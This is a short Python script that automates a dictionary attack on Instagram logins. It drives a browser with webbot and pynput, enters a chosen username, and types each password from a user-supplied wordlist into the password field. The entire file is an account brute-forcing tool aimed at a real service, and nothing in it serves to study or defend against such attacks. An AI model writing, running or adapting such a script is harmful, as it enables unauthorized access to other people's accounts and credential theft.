from webbot import Browser
from pynput.keyboard import Key, Controller
import time
username = input('Username: ')
dictionary = input('Choose Dictionary: ')

file = open(f'{dictionary}.txt', 'r')
bruteforce = []
for line in file: bruteforce.append(line.strip())
file.close()

web = Browser()
keyboard = Controller()


web.go_to('www.instagram.com')
time.sleep(3)
keyboard.tap(Key.enter)
time.sleep(3)
keyboard.tap(Key.tab)
time.sleep(3)
web.type(username)
keyboard.tap(Key.tab)
for brute in bruteforce:
    web.type(brute, into="Password")
    keyboard.tap(Key.enter)
